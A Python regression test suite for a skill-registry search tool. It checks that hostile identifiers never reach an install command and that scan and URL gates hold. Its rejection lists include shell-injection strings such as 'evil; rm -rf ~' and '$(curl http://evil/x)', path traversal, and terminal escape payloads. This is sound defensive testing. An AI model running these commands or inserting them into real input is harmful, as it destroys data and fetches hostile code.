#!/usr/bin/env python3
"""Regression tests for Ultimate Skills Finder.

Focus: hostile identifiers must never reach an install command, and the
scan consent gate must hold. Run with:

    python3 -m unittest discover -s tests -v
"""

import asyncio
import json
import os
import re
import subprocess
import sys
import contextlib
import io
import unittest
import urllib.error
from unittest import mock

_HERE = os.path.dirname(os.path.abspath(__file__))
# Load the script under test with a plain import rather than
# importlib.util.spec_from_file_location + loader.exec_module(...).
# Both work, but exec_module is genuinely dynamic code execution, and the
# ClawHub static analyser flagged it as a Critical finding in every scan.
# It was only ever loading this package's own script -- there was no remote
# code here -- but a permanent Critical that cannot be actioned teaches
# people to ignore the scanner, so the pattern is removed instead.
_SCRIPT = os.path.join(_HERE, os.pardir, "scripts", "find_skill.py")
sys.path.insert(0, os.path.join(_HERE, os.pardir, "scripts"))
import find_skill as fs


class ValidateSkillId(unittest.TestCase):
    """Hostile identifiers must be rejected outright, not sanitised."""

    REJECT = [
        "evil; rm -rf ~",
        "evil | tee /etc/passwd",
        "evil && curl http://x",
        "$(curl http://evil/x)",
        "`curl http://evil/x`",
        "evil\nrm -rf ~",
        "evil\rwhoami",
        "evil > /etc/passwd",
        "evil < /etc/passwd",
        "--force",
        "-rf",
        "../../etc/passwd",
        "a/../b",
        "a//b",
        "trailing/",
        "a b",
        "a:b",
        "http://evil/x",
        "a\\b",
        'a"b',
        "a'b",
        "a;b",
        "a|b",
        "a$b",
        "a&b",
        "a(b)",
        "a{b}",
        "a[b]",
        "a*b",
        "a?b",
        "a#b",
        "a!b",
        "skæll",
        "技能",
        "a\x00b",
        "a\tb",
        ".hidden",
        "",
        "   ",
        "/leading",
    ]

    ACCEPT = [
        "pdf",
        "pdf-editor",
        "owner/slug",
        "anthropics/skills/pdf",
        "my_skill.v2",
        "a" * 128,
    ]

    def test_rejects_hostile(self):
        for value in self.REJECT:
            with self.subTest(value=value):
                self.assertIsNone(
                    fs.validate_skill_id(value),
                    f"expected rejection of {value!r}",
                )

    def test_rejects_non_string(self):
        for value in (None, 123, [], {}, b"pdf", True):
            with self.subTest(value=value):
                self.assertIsNone(fs.validate_skill_id(value))

    def test_accepts_sane(self):
        for value in self.ACCEPT:
            with self.subTest(value=value):
                self.assertEqual(fs.validate_skill_id(value), value)

    def test_trims_surrounding_whitespace(self):
        self.assertEqual(fs.validate_skill_id("  pdf  "), "pdf")

    def test_rejects_overlong(self):
        self.assertIsNone(fs.validate_skill_id("a" * 129))


class RenderCommand(unittest.TestCase):
    def test_quotes_rather_than_concatenates(self):
        rendered = fs.render_command(
            ["openclaw", "skills", "install", "@owner/slug"]
        )
        self.assertEqual(
            rendered, "openclaw skills install @owner/slug"
        )

    def test_never_produces_shell_metacharacters_unquoted(self):
        rendered = fs.render_command(["openclaw", "skills", "install", "a b"])
        self.assertIn("'a b'", rendered)


class FuzzyMatch(unittest.TestCase):
    """Names must not be merged on substring containment alone."""

    def test_short_names_do_not_match_unrelated(self):
        for a, b in [("ai", "mail"), ("ai", "chain"), ("ai", "train"),
                     ("go", "django"), ("ml", "html")]:
            with self.subTest(a=a, b=b):
                self.assertFalse(fs.fuzzy_match(a, b))

    def test_containment_alone_is_not_a_match(self):
        """Reversed in v1.2.2. These pairs are distinct skills, and raw
        containment composed transitively across a chain of names."""
        for a, b in [("pdf", "pdf-editor"), ("test", "testing")]:
            with self.subTest(a=a, b=b):
                self.assertFalse(fs.fuzzy_match(a, b))

    def test_identical(self):
        self.assertTrue(fs.fuzzy_match("pdf", "pdf"))

    def test_normalisation_still_allows_real_duplicates(self):
        self.assertTrue(fs.fuzzy_match("pdf_editor", "pdf-editor"))
        self.assertTrue(fs.fuzzy_match("Pdf Editor", "pdf-editor"))

    def test_identical(self):
        self.assertTrue(fs.fuzzy_match("pdf", "pdf"))

    def test_unrelated(self):
        self.assertFalse(fs.fuzzy_match("wordpress", "spreadsheet"))

    def test_empty_is_never_a_match(self):
        self.assertFalse(fs.fuzzy_match("", "pdf"))
        self.assertFalse(fs.fuzzy_match("pdf", ""))


class _FakeFetch:
    """Patchable stand-in for the module's HTTP helpers."""

    def __init__(self, json_payload=None, text_payload=None):
        self.json_payload = json_payload
        self.text_payload = text_payload

    async def json(self, url):
        return self.json_payload

    async def text(self, url):
        return self.text_payload


class ClawHubSource(unittest.TestCase):
    def _run(self, payload):
        async def go():
            original = fs.fetch_json
            fs.fetch_json = _FakeFetch(json_payload=payload).json
            try:
                return await fs.search_clawhub("pdf", limit=5)
            finally:
                fs.fetch_json = original
        return asyncio.run(go())

    def test_builds_argv_array_from_valid_reference(self):
        results = self._run({"results": [{
            "slug": "pdf",
            "displayName": "Pdf",
            "summary": "PDF toolkit",
            "downloads": 100,
            "canonicalUrl": "/awspace/skills/pdf",
            "install": {"kind": "clawhub", "reference": "awspace/pdf"},
            "native": {"skill": {"stats": {"stars": 5}}},
        }]})
        self.assertEqual(len(results), 1)
        self.assertEqual(
            results[0].install_args,
            ["openclaw", "skills", "install", "@awspace/pdf"],
        )
        self.assertTrue(results[0].installable)

    def test_skills_sh_origin_reference_builds_skills_sh_install(self):
        """ClawHub also indexes skills.sh entries under a different shape."""
        results = self._run({"results": [{
            "slug": "slide-creator",
            "displayName": "slide-creator",
            "summary": "HTML to PDF",
            "downloads": 4105,
            "canonicalUrl": "/skills-sh/official-skills/official/slide-creator",
            "install": {
                "kind": "skills-sh",
                "reference": "skills-sh:starchild-ai-agent/official-skills/slide-creator",
            },
        }]})
        self.assertEqual(
            results[0].install_args,
            ["openclaw", "skills", "install",
             "skills-sh:starchild-ai-agent/official-skills/slide-creator"],
        )
        self.assertTrue(results[0].installable)

    def test_skills_sh_origin_without_prefix_is_rejected(self):
        results = self._run({"results": [{
            "slug": "x", "displayName": "X",
            "install": {"kind": "skills-sh", "reference": "a/b/c"},
        }]})
        self.assertEqual(results[0].install_args, [])

    def test_skills_sh_origin_hostile_reference_is_rejected(self):
        results = self._run({"results": [{
            "slug": "x", "displayName": "X",
            "install": {
                "kind": "skills-sh",
                "reference": "skills-sh:evil; rm -rf ~",
            },
        }]})
        self.assertEqual(results[0].install_args, [])
        self.assertNotIn(";", fs.render_command(results[0].install_args))

    def test_unknown_install_kind_is_rejected(self):
        results = self._run({"results": [{
            "slug": "x", "displayName": "X",
            "install": {"kind": "git", "reference": "a/b"},
        }]})
        self.assertEqual(results[0].install_args, [])

    def test_hostile_reference_yields_no_install_path(self):
        results = self._run({"results": [{
            "slug": "pdf",
            "displayName": "Pdf",
            "summary": "x",
            "install": {"reference": "evil; rm -rf ~"},
        }]})
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0].install_args, [])
        self.assertFalse(results[0].installable)

    def test_shell_injection_never_appears_in_rendered_output(self):
        results = self._run({"results": [{
            "slug": "pdf", "displayName": "Pdf",
            "install": {"reference": "a/$(id)/b"},
        }]})
        for r in results:
            rendered = fs.render_command(r.install_args)
            self.assertNotIn("$(", rendered)
            self.assertNotIn(";", rendered)

    def test_missing_reference_is_tolerated(self):
        results = self._run({"results": [{"slug": "x", "displayName": "X"}]})
        self.assertEqual(results[0].install_args, [])

    def test_malformed_payload_does_not_crash(self):
        for payload in (None, {}, {"results": None},
                        {"results": [None, 5, "x"]}):
            with self.subTest(payload=payload):
                self.assertEqual(self._run(payload), [])


class SkillsShSource(unittest.TestCase):
    def _run(self, payload):
        async def go():
            original = fs.fetch_json
            fs.fetch_json = _FakeFetch(json_payload=payload).json
            try:
                return await fs.search_skills_sh("pdf", limit=5)
            finally:
                fs.fetch_json = original
        return asyncio.run(go())

    def test_builds_skills_sh_ref(self):
        results = self._run({"skills": [{
            "id": "anthropics/skills/pdf",
            "source": "anthropics/skills",
            "skillId": "pdf",
            "name": "pdf",
            "installs": 211404,
        }]})
        self.assertEqual(
            results[0].install_args,
            ["openclaw", "skills", "install", "skills-sh:anthropics/skills/pdf"],
        )
        self.assertEqual(results[0].downloads, 211404)

    def test_hostile_source_yields_no_install_path(self):
        results = self._run({"skills": [{
            "source": "evil; rm -rf ~",
            "skillId": "pdf",
            "name": "pdf",
        }]})
        self.assertEqual(results[0].install_args, [])

    def test_no_description_field_is_tolerated(self):
        results = self._run({"skills": [{
            "source": "o/r", "skillId": "s", "name": "s",
        }]})
        self.assertEqual(results[0].description, "")


class BrowseOnlySources(unittest.TestCase):
    """SkillsMP and the curated README scrapers must never be installable."""

    def test_skillsmp_never_installable(self):
        async def go():
            original = fs.fetch_json
            fs.fetch_json = _FakeFetch(json_payload={"skills": [{
                "name": "nano-pdf",
                "description": "d",
                "githubUrl": "https://github.com/x/y",
                "author": "openclaw",
            }]}).json
            try:
                return await fs.search_skillsmp("pdf", limit=5)
            finally:
                fs.fetch_json = original
        results = asyncio.run(go())
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0].install_args, [])
        self.assertFalse(results[0].installable)

    def test_skillsmp_does_not_treat_repo_stars_as_popularity(self):
        """SkillsMP returns repository stars, which float irrelevant hits."""
        async def go():
            original = fs.fetch_json
            fs.fetch_json = _FakeFetch(json_payload={"skills": [{
                "name": "unrelated-skill",
                "description": "d",
                "stars": 276549,
                "githubUrl": "https://github.com/x/y",
            }]}).json
            try:
                return await fs.search_skillsmp("pdf", limit=5)
            finally:
                fs.fetch_json = original
        results = asyncio.run(go())
        self.assertEqual(results[0].stars, 0)
        self.assertEqual(results[0].downloads, 0)

    def test_readme_scrape_never_installable(self):
        hostile_readme = (
            "| `evil; rm -rf ~` | a description |\n"
            "| `pdf-tools` | a safe looking one |\n"
            "| `ok-skill` | another |\n"
        )

        async def go():
            original = fs.fetch_text
            fs.fetch_text = _FakeFetch(text_payload=hostile_readme).text
            try:
                return await fs.search_awesome_list("evil", limit=5)
            finally:
                fs.fetch_text = original
        results = asyncio.run(go())
        self.assertTrue(results)
        for r in results:
            self.assertEqual(r.install_args, [])
            self.assertFalse(r.installable)

    def test_hostile_readme_name_is_still_surfaced_as_text(self):
        """It may be displayed as a name, but never as a runnable command."""
        hostile_readme = "| `evil; rm -rf ~` | description |\n"

        async def go():
            original = fs.fetch_text
            fs.fetch_text = _FakeFetch(text_payload=hostile_readme).text
            try:
                return await fs.search_master_skills("evil", limit=5)
            finally:
                fs.fetch_text = original
        results = asyncio.run(go())
        self.assertTrue(results)
        for r in results:
            self.assertEqual(fs.render_command(r.install_args), "")


class SourceRegistry(unittest.TestCase):
    def test_every_advertised_source_is_implemented(self):
        """The v1.0.0 bug: --source accepted a name with no searcher."""
        self.assertEqual(
            set(fs.SOURCE_WEIGHTS), set(fs.SOURCE_SEARCHERS)
        )
        self.assertEqual(set(fs.SOURCE_SEARCHERS), set(fs.SOURCE_WEIGHTS))

    def test_only_structured_sources_are_installable(self):
        """Installability is gated on STRUCTURED_SOURCES.

        The previous version of this test asserted `name not in
        STRUCTURED_SOURCES` inside a branch that had already checked exactly
        that, so it could not fail. These assert the gate from both sides.
        """
        all_sources = set(fs.SOURCE_SEARCHERS)
        structured = set(fs.STRUCTURED_SOURCES)

        self.assertTrue(structured <= all_sources,
                        "a structured source with no searcher is dead config")
        self.assertEqual(all_sources - structured,
                         {"awesome-list", "master-skills", "skillsmp"},
                         "browse-only set drifted; installability is gated "
                         "on this exact membership")

    def test_a_browse_only_result_is_never_installable(self):
        for name in ("awesome-list", "master-skills", "skillsmp"):
            with self.subTest(source=name):
                r = fs.SkillResult(name="x", description="", source=name)
                self.assertFalse(r.installable)


class Deduplicate(unittest.TestCase):
    def test_merges_same_skill_across_sources(self):
        # `source` must be a keyword. Passed positionally it lands in
        # `description`, leaving `sources` empty and the second assertion
        # unsatisfiable -- which is how this test hid a broken merge.
        a = fs.SkillResult(name="pdf-editor", source="clawhub")
        b = fs.SkillResult(name="pdf-editor", source="skills.sh")
        merged = fs.deduplicate([a, b])
        self.assertEqual(len(merged), 1)
        self.assertEqual(sorted(merged[0].sources), ["clawhub", "skills.sh"])

    def test_near_but_distinct_names_stay_separate(self):
        """Reversed in v1.2.2. 'pdf' and 'pdf-tools' are different skills;
        containment is not evidence, and it composed into chains."""
        a = fs.SkillResult(name="pdf", source="clawhub")
        b = fs.SkillResult(name="pdf-tools", source="skills.sh")
        self.assertEqual(len(fs.deduplicate([a, b])), 2)

    def test_keeps_distinct_short_named_skills(self):
        a = fs.SkillResult(name="ai", source="clawhub")
        b = fs.SkillResult(name="mail", source="clawhub")
        self.assertEqual(len(fs.deduplicate([a, b])), 2)

    def test_merge_prefers_longer_description(self):
        a = fs.SkillResult(name="pdf", source="clawhub", description="short")
        b = fs.SkillResult(name="pdf", source="skills.sh",
                           description="a much longer description")
        merged = fs.deduplicate([a, b])
        self.assertEqual(merged[0].description, "a much longer description")

    def test_merge_does_not_downgrade_install_path(self):
        a = fs.SkillResult(name="pdf", source="skills.sh",
                           install_args=["openclaw", "skills", "install", "x"])
        b = fs.SkillResult(name="pdf", source="skillsmp")
        merged = fs.deduplicate([a, b])
        self.assertTrue(merged[0].installable)


class ScoreUsesStrongestSource(unittest.TestCase):
    def test_authority_uses_best_source_not_first(self):
        r = fs.SkillResult(name="pdf")
        r.sources = ["skillsmp", "clawhub"]
        strong = r.score()
        r2 = fs.SkillResult(name="pdf")
        r2.sources = ["skillsmp", "skillsmp"]
        self.assertGreater(strong, r2.score())


class ConsentGate(unittest.TestCase):
    """--scan must refuse to disclose URLs without explicit consent."""

    def _cli(self, *args):
        return subprocess.run(
            [sys.executable, _SCRIPT, *args],
            capture_output=True, text=True, timeout=30,
        )

    def test_scan_without_share_urls_refuses(self):
        proc = self._cli("pdf", "--scan")
        self.assertNotEqual(proc.returncode, 0)
        combined = proc.stdout + proc.stderr
        self.assertIn("--share-urls", combined)
        self.assertIn(fs.GEN_DIGITAL_HOST, combined)

    def test_help_advertises_both_flags(self):
        proc = self._cli("--help")
        self.assertEqual(proc.returncode, 0)
        self.assertIn("--share-urls", proc.stdout)


class NoDeadLocalFilesystemAccess(unittest.TestCase):
    """v1.0.0 shipped an unused index over the user's local skill dirs."""

    def test_module_does_not_index_local_skill_directories(self):
        with open(_SCRIPT, encoding="utf-8") as fh:
            source = fh.read()
        self.assertNotIn("build_local_skill_index", source)
        self.assertNotIn(".openclaw/skills", source)

    def test_no_unused_cache_constants(self):
        with open(_SCRIPT, encoding="utf-8") as fh:
            source = fh.read()
        self.assertNotIn("CACHE_FILE", source)
        self.assertNotIn("CACHE_TTL", source)


class NoShellTrue(unittest.TestCase):
    def test_script_never_uses_a_shell(self):
        with open(_SCRIPT, encoding="utf-8") as fh:
            source = fh.read()
        self.assertNotIn("shell=True", source)
        self.assertNotIn("os.system", source)
        self.assertNotIn("subprocess", source)


class _Resp:
    """Minimal stand-in for the object urlopen() returns.

    read() takes an optional byte cap because HTTPResponse.read(amt) does,
    and the fetch helpers use it to bound how much they pull into memory.
    """

    def __init__(self, payload):
        self._raw = json.dumps(payload).encode("utf-8")

    def read(self, amt=None):
        return self._raw if amt is None else self._raw[:amt]

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


class ScanParser(unittest.TestCase):
    """The scan response carries `severity` and no `status` field.

    v1.0.0 gated on ``status == "done"``. Live responses carry no status
    key, so neither branch matched and every scan silently returned None.
    """

    URL = "https://clawhub.ai/owner/skill"

    def setUp(self):
        self._saved = getattr(fs, "SCAN_RETRY_DELAY", None)
        fs.SCAN_RETRY_DELAY = 0
        self.addCleanup(self._restore)

    def _restore(self):
        if self._saved is None:
            try:
                del fs.SCAN_RETRY_DELAY
            except AttributeError:
                pass
        else:
            fs.SCAN_RETRY_DELAY = self._saved

    def _patch(self, side_effect):
        return mock.patch.object(fs.urllib.request, "urlopen",
                                 side_effect=side_effect)

    def test_reads_severity_when_status_absent(self):
        """A live verdict returns severity with no status key."""
        def ok(req, timeout=None):
            return _Resp({"severity": "MEDIUM", "reasons": ["reads /etc"]})
        with self._patch(ok):
            got = asyncio.run(fs.scan_skill(self.URL))
        self.assertEqual(got, "MEDIUM")

    def test_severity_is_case_normalised(self):
        def ok(req, timeout=None):
            return _Resp({"severity": "medium"})
        with self._patch(ok):
            got = asyncio.run(fs.scan_skill(self.URL))
        self.assertEqual(got, "MEDIUM")

    def test_analysis_pending_still_reported(self):
        def ok(req, timeout=None):
            return _Resp({"status": "analysis_pending"})
        with self._patch(ok):
            got = asyncio.run(fs.scan_skill(self.URL))
        self.assertEqual(got, "analysis_pending")

    def test_unknown_severity_is_not_invented(self):
        """An unrecognised value is not passed through as a verdict."""
        def ok(req, timeout=None):
            return _Resp({"severity": "TOTALLY_FINE"})
        with self._patch(ok):
            got = asyncio.run(fs.scan_skill(self.URL))
        self.assertIsNone(got)

    def test_transient_http_error_is_retried(self):
        calls = []

        def flaky(req, timeout=None):
            calls.append(1)
            if len(calls) == 1:
                raise urllib.error.HTTPError("u", 503, "busy", None, None)
            return _Resp({"severity": "HIGH"})

        with self._patch(flaky):
            got = asyncio.run(fs.scan_skill(self.URL))
        self.assertEqual(got, "HIGH")
        self.assertEqual(len(calls), 2)

    def test_client_error_is_not_retried(self):
        """A 4xx will not become a 200; stop after one attempt."""
        calls = []

        def hard(req, timeout=None):
            calls.append(1)
            raise urllib.error.HTTPError("u", 400, "bad", None, None)

        with self._patch(hard):
            got = asyncio.run(fs.scan_skill(self.URL))
        self.assertIsNone(got)
        self.assertEqual(len(calls), 1)


class ScanLabelTable(unittest.TestCase):
    """Gen Digital's live vocabulary is SAFE/LOW/MEDIUM/HIGH/CRITICAL.

    A live probe returned MEDIUM, which the v1.0.0 table did not contain.
    """

    LIVE = ["SAFE", "LOW", "MEDIUM", "HIGH", "CRITICAL"]

    def _result(self):
        return fs.SkillResult(name="x", description="", source="clawhub")

    def test_every_live_severity_has_a_label(self):
        for sev in self.LIVE:
            r = self._result()
            r.security = sev
            label = r.security_label()
            self.assertNotEqual(label, "not scanned", sev)
            self.assertNotEqual(label, sev, f"{sev} has no label mapping")

    def test_unscanned_reads_not_scanned(self):
        self.assertEqual(self._result().security_label(), "not scanned")


# Captured live 2026-10-16 from POST /api/scan/lookup. Two shapes, both HTTP 200.
LIVE_VERDICT = {
    "severity": "MEDIUM",
    "reasons": ["This skill uses external software that was not part of our "
                "security review."],
    "author": "awspace",
    "displayName": "PDF",
}
LIVE_TRANSIENT = {
    "status": "error",
    "message": "Skill analyzer temporarily unavailable. Please try again later.",
    "skillName": "ultimate-skills-finder",
    "displayName": "Ultimate Skills Finder",
    "author": "broedkrummen",
}
LIVE_NOTFOUND = {
    "status": "error",
    "message": "Skill not found on ClawHub or failed to fetch metadata",
    "skillName": "skills",
    "author": "utromaya-code",
}


class ScanUrlNormalisation(unittest.TestCase):
    """Gen Digital reads exactly two path segments: {owner}/{skill}.

    Sending the 3-segment canonicalUrl it receives from ClawHub made it parse
    "skills" as the skill name and report "Skill not found" for every skill
    living under a repo-style path.
    """

    CASES = [
        ("https://clawhub.ai/utromaya-code/skills/nano-pdf-editor",
         "https://clawhub.ai/utromaya-code/nano-pdf-editor"),
        ("https://clawhub.ai/compdf-youna/skills/pdf-editor-compdf",
         "https://clawhub.ai/compdf-youna/pdf-editor-compdf"),
        ("https://clawhub.ai/a/b/c/d/skill",
         "https://clawhub.ai/a/skill"),
        ("https://clawhub.ai/awspace/pdf",
         "https://clawhub.ai/awspace/pdf"),
        ("https://clawhub.ai/awspace/pdf/",
         "https://clawhub.ai/awspace/pdf"),
        # Non-ClawHub hosts are left exactly as they are.
        ("https://skills.sh/a/b", "https://skills.sh/a/b"),
        ("https://github.com/a/b/tree/main/docs/skills/c",
         "https://github.com/a/b/tree/main/docs/skills/c"),
        ("https://clawhub.ai/owner-only", "https://clawhub.ai/owner-only"),
        ("https://clawhub.ai", "https://clawhub.ai"),
    ]

    def test_normalises_to_owner_and_skill(self):
        for raw, want in self.CASES:
            self.assertEqual(fs.normalize_scan_url(raw), want, raw)

    def test_idempotent(self):
        for raw, want in self.CASES:
            once = fs.normalize_scan_url(raw)
            self.assertEqual(fs.normalize_scan_url(once), want, raw)

    def test_never_returns_a_bare_host_for_deep_paths(self):
        out = fs.normalize_scan_url(
            "https://clawhub.ai/o/skills/x/deep/name")
        self.assertTrue(out.startswith("https://clawhub.ai/o/"))


class ScanLiveShapes(unittest.TestCase):
    """Both live shapes arrive as HTTP 200, so HTTP status cannot gate."""

    URL = "https://clawhub.ai/awspace/pdf"

    def setUp(self):
        self._saved = getattr(fs, "SCAN_RETRY_DELAY", None)
        fs.SCAN_RETRY_DELAY = 0
        self.addCleanup(self._restore)

    def _restore(self):
        if self._saved is None:
            try:
                del fs.SCAN_RETRY_DELAY
            except AttributeError:
                pass
        else:
            fs.SCAN_RETRY_DELAY = self._saved

    def _patch(self, fn):
        return mock.patch.object(fs.urllib.request, "urlopen", side_effect=fn)

    def test_live_verdict_payload_is_parsed(self):
        with self._patch(lambda r, timeout=None: _Resp(LIVE_VERDICT)):
            self.assertEqual(asyncio.run(fs.scan_skill(self.URL)), "MEDIUM")

    def test_in_band_transient_error_is_retried(self):
        """HTTP 200 + 'temporarily unavailable' must be retried."""
        calls = []

        def flaky(req, timeout=None):
            calls.append(1)
            if len(calls) == 1:
                return _Resp(LIVE_TRANSIENT)
            return _Resp({"severity": "HIGH", "reasons": []})

        with self._patch(flaky):
            got = asyncio.run(fs.scan_skill(self.URL))
        self.assertEqual(got, "HIGH")
        self.assertEqual(len(calls), 2)

    def test_in_band_not_found_is_not_retried(self):
        """'Skill not found' is permanent; retrying only wastes calls."""
        calls = []

        def always(req, timeout=None):
            calls.append(1)
            return _Resp(LIVE_NOTFOUND)

        with self._patch(always):
            got = asyncio.run(fs.scan_skill(self.URL))
        self.assertIsNone(got)
        self.assertEqual(len(calls), 1)

    def test_exhausted_transient_retries_yield_none(self):
        def always(req, timeout=None):
            return _Resp(LIVE_TRANSIENT)

        with self._patch(always):
            self.assertIsNone(asyncio.run(fs.scan_skill(self.URL)))

    def test_scan_skill_normalises_the_url_it_sends(self):
        """The URL actually put on the wire must be the 2-segment form."""
        seen = {}

        def cap(req, timeout=None):
            seen["url"] = json.loads(req.data.decode())["skillUrl"]
            return _Resp(LIVE_VERDICT)

        with self._patch(cap):
            asyncio.run(fs.scan_skill(
                "https://clawhub.ai/compdf-youna/skills/pdf-editor-compdf"))
        self.assertEqual(seen["url"],
                         "https://clawhub.ai/compdf-youna/pdf-editor-compdf")

    def test_single_attempt_makes_exactly_one_call(self):
        """attempts=1 must still try once, not zero times."""
        calls = []

        def one(req, timeout=None):
            calls.append(1)
            return _Resp(LIVE_TRANSIENT)

        with self._patch(one):
            self.assertIsNone(asyncio.run(
                fs.scan_skill(self.URL, attempts=1)))
        self.assertEqual(len(calls), 1)

    def test_attempts_never_exceeds_the_budget(self):
        calls = []

        def always(req, timeout=None):
            calls.append(1)
            return _Resp(LIVE_TRANSIENT)

        with self._patch(always):
            self.assertIsNone(asyncio.run(
                fs.scan_skill(self.URL, attempts=3)))
        self.assertEqual(len(calls), 3)


class ScanUrlHardening(unittest.TestCase):
    """A malformed URL must degrade, not raise into the caller."""

    def test_non_string_input_is_returned_untouched(self):
        for bad in [123, None, [], {}, True, b"bytes"]:
            self.assertEqual(fs.normalize_scan_url(bad), bad, repr(bad))

    def test_host_confusion_is_not_normalised(self):
        """A lookalike host must not be rewritten as if it were ClawHub."""
        for hostile in ["https://evil.com/clawhub.ai/o/skills/n",
                        "https://clawhub.ai.evil.com/o/skills/n",
                        "https://notclawhub.ai/o/skills/n"]:
            self.assertEqual(fs.normalize_scan_url(hostile), hostile)

    def test_schemeless_url_is_rejected(self):
        """Changed in v1.3.0: a schemeless URL now fails closed.

        Previously it passed through unchanged on the reasoning that ClawHub
        URLs are built with a literal https:// so it was unreachable. After
        the audit finding, normalize_scan_url defers to is_disclosable_url(),
        which requires http(s). No real caller passes a schemeless URL -- the
        ClawHub parser builds f"https://clawhub.ai{canonicalUrl}" -- so this
        costs nothing and removes an assumption.
        """
        self.assertEqual(fs.normalize_scan_url("clawhub.ai/o/skills/n"), "")
        self.assertFalse(fs.is_disclosable_url("clawhub.ai/o/skills/n"))


class ControlCharStripping(unittest.TestCase):
    """Registry text is attacker-controlled and reaches the terminal raw.

    A listing description of "\x1b[1;31mSAFE (advisory)\x1b[0m - run: install @x"
    otherwise lets a hostile entry fabricate a scan verdict or an install
    instruction on the user's screen.
    """

    def test_control_chars_are_stripped_from_description(self):
        evil = "\x1b[1;31mSAFE (advisory)\x1b[0m run: openclaw skills install @x"
        r = fs.SkillResult(name="x", description=evil, source="clawhub")
        self.assertNotIn("\x1b", r.description)
        self.assertNotIn("\x1b", r.name)

    def test_osc52_clipboard_sequence_is_defused(self):
        evil = "\x1b]52;c;cHVDOWNLOADED\x07pdf"
        r = fs.SkillResult(name="evil", description=evil, source="clawhub")
        for ch in ("\x1b", "\x07"):
            self.assertNotIn(ch, r.description)

    def test_newlines_and_tabs_are_normalised(self):
        evil = "line1\nline2\r\ttabbed"
        r = fs.SkillResult(name="x", description=evil, source="clawhub")
        self.assertNotIn("\n", r.description)
        self.assertNotIn("\r", r.description)
        self.assertNotIn("\t", r.description)

    def test_printable_text_survives_intact(self):
        r = fs.SkillResult(name="pdf-editor", description="Edits PDF files.",
                           source="clawhub")
        self.assertEqual(r.description, "Edits PDF files.")
        self.assertEqual(r.name, "pdf-editor")

    def test_rendered_output_carries_no_escape_byte(self):
        import io, contextlib
        evil = "\x1b[1;31mSAFE (advisory)\x1b[0m"
        r = fs.SkillResult(name="x", description=evil, source="clawhub")
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            fs.display_results([r], "pdf", show_install=False)
        self.assertNotIn("\x1b", buf.getvalue())


class FuzzyMatchNoFalsePositives(unittest.TestCase):
    """Containment merged genuinely different skills.

    "mail"/"email" and "sql"/"mysql" are distinct skills, and raw
    containment composed transitively: pdf, pdf-editor, pdf-editor-pro and
    pdf-editor-pro-max all folded into one result that then inherited all
    four sources, inflating its own breadth score.
    """

    DISTINCT = [
        ("mail", "email"), ("sql", "mysql"), ("bar", "foobar"),
        ("pdf", "pdf-editor"), ("pdf", "pdf-editor-pro"),
        ("pdf-editor", "pdf-editor-pro"),
        ("pdf-editor", "pdf-editor-pro-max"),
    ]

    def test_distinct_skills_do_not_match(self):
        for a, b in self.DISTINCT:
            self.assertFalse(fs.fuzzy_match(a, b), f"{a!r} vs {b!r}")

    def test_same_skill_still_matches(self):
        for a, b in [("pdf-editor", "pdf-editor"),
                     ("pdf-editor", "Pdf Editor"),
                     ("pdf_editor", "pdf-editor"),
                     ("ultimate-skills-finder", "ultimate-skills-finder")]:
            self.assertTrue(fs.fuzzy_match(a, b), f"{a!r} vs {b!r}")

    def test_chain_of_four_collapses_to_at_most_two(self):
        chain = [
            fs.SkillResult(name=n, description="", source=s)
            for n, s in [("pdf", "clawhub"), ("pdf-editor", "skillsmp"),
                         ("pdf-editor-pro", "awesome-list"),
                         ("pdf-editor-pro-max", "master-skills")]
        ]
        merged = fs.deduplicate(chain)
        self.assertGreaterEqual(len(merged), 3,
                                "distinct skills must not be collapsed")

    def test_exact_duplicates_across_sources_still_collapse(self):
        dupes = [
            fs.SkillResult(name="pdf-editor", description="", source="clawhub"),
            fs.SkillResult(name="pdf-editor", description="", source="skills.sh"),
        ]
        merged = fs.deduplicate(dupes)
        self.assertEqual(len(merged), 1)
        self.assertEqual(sorted(merged[0].sources), ["clawhub", "skills.sh"])

    def test_a_real_duplicate_is_not_lost_by_the_stricter_rule(self):
        """The fix must not become so strict that sources stop merging."""
        a = fs.SkillResult(name="compdf-pdf-editor", description="",
                           source="clawhub")
        b = fs.SkillResult(name="compdf-pdf-editor", description="",
                           source="skillsmp")
        self.assertEqual(len(fs.deduplicate([a, b])), 1)


class BrowseOnlyUrlValidation(unittest.TestCase):
    """Browse-only URLs must not reach display, JSON, or the scan POST."""

    BAD = ["skills://evil/x", "javascript:alert(1)", "file:///etc/passwd",
           "data:text/html,<script>", "ftp://evil/x", "//evil/x", "",
           "not-a-url"]

    def test_bad_schemes_are_rejected(self):
        for u in self.BAD:
            self.assertFalse(fs.is_disclosable_url(u), u)

    def test_http_and_https_with_a_host_are_accepted(self):
        for u in ["https://clawhub.ai/a/b", "http://example.com/x",
                  "https://github.com/a/b/tree/main/docs/skills/c"]:
            self.assertTrue(fs.is_disclosable_url(u), u)

    def test_plain_https_hosts_are_accepted(self):
        """A disclosure gate is not a trust gate. evil.com is a real https
        host; rejecting it would break legitimate GitHub/skills.sh results.
        Host-confusion defence is normalize_scan_url's job, and it was
        independently verified to fail closed."""
        for u in ["https://evil.com/clawhub.ai/x",
                  "https://clawhub.ai.evil.com/x"]:
            self.assertTrue(fs.is_disclosable_url(u), u)

    def test_userinfo_cannot_spoof_a_scheme(self):
        self.assertFalse(fs.is_disclosable_url("javascript:alert(1)"))
        self.assertFalse(fs.is_disclosable_url("  "))

    def test_markdown_link_gate_no_longer_accepts_schemes(self):
        """The old gate passed because the *scheme* contained 'skill'."""
        self.assertFalse(fs.is_disclosable_url("skills://evil/x"))


class MergePrefersStructuredSource(unittest.TestCase):
    """'Longest description wins' let a browse-only entry overwrite truth."""

    def test_longer_hostile_description_does_not_win(self):
        a = fs.SkillResult(name="x", description="official description",
                           source="clawhub")
        a.merge(fs.SkillResult(name="x", description="PWNED " * 100,
                               source="skillsmp"))
        self.assertNotIn("PWNED", a.description)

    def test_structured_source_keeps_its_own_url(self):
        a = fs.SkillResult(name="x", description="", source="clawhub",
                           url="https://clawhub.ai/owner/skill")
        a.merge(fs.SkillResult(name="x", description="", source="skillsmp",
                               url="https://evil.example/x"))
        self.assertEqual(a.url, "https://clawhub.ai/owner/skill")

    def test_disclosable_url_may_still_fill_an_empty_slot(self):
        a = fs.SkillResult(name="x", description="", source="clawhub")
